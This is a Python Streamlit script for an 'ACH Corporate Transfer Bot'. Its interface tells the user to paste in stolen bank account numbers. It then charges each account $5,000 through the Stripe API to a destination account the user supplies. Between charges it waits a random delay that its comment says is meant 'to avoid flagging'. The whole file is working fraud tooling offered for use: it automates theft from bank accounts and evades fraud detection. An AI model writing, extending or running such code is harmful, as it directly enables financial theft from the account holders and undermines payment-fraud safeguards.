import streamlit as st
import requests
import random
import time

# --- CONFIGURATION ---
st.set_page_config(page_title="ACH Transfer Bot", layout="wide")

# Sidebar for inputs
st.sidebar.title("⚙️ Settings")

stripe_key = st.sidebar.text_input("Stripe API Key", type="password")
dest_account = st.sidebar.text_input("Destination Account ID")
routing_num = st.sidebar.text_input("Routing Number (e.g., 026009593)", value="026009593")

# Main content
st.title("🚀 ACH Corporate Transfer Bot")
st.markdown("Enter your stolen bank account numbers below to process transfers.")

accounts_input = st.text_area("Bank Accounts (One per line)", placeholder="****12345678\n****87654321")
amount = st.number_input("Amount per transfer ($)", value=5000.00)

if st.button("🚀 Start Transferring"):
 accounts = [acc.strip() for acc in accounts_input.split('\n') if acc.strip()]

 if not accounts:
 st.error("Please enter at least one account number.")
 elif not stripe_key or not dest_account:
 st.error("Please fill in the Stripe API Key and Destination Account.")
 else:
 st.success(f"Starting automation for {len(accounts)} accounts...")

 for i, account in enumerate(accounts):
 st.write(f"--- Processing Account {i+1}: {account} ---")

 # Construct Payload
 payload = {
 "amount": int(amount * 100),
 "currency": "usd",
 "source": {
 "object": "bank_account",
 "country": "US",
 "routing_number": routing_num,
 "account_number": account,
 "account_holder_type": "company"
 },
 "destination": dest_account,
 "statement_descriptor": "CORP_PAYOUT",
 "description": "Corporate Transfer"
 }

 headers = {
 "Authorization": f"Bearer {stripe_key}",
 "Content-Type": "application/x-www-form-urlencoded"
 }

 try:
 response = requests.post(
 "https://api.stripe.com/v1/charges",
 data=payload,
 headers=headers
 )
 result = response.json()

 if response.status_code == 200:
 st.success(f"✅ Success: ${amount} sent from {account}")
 else:
 error_msg = result.get('error', {}).get('message', 'Unknown')
 st.error(f"❌ Failed: {error_msg}")

 except Exception as e:
 st.error(f"Connection Error: {e}")

 # Wait to avoid flagging
 time.sleep(random.uniform(60, 300))

 st.balloons()
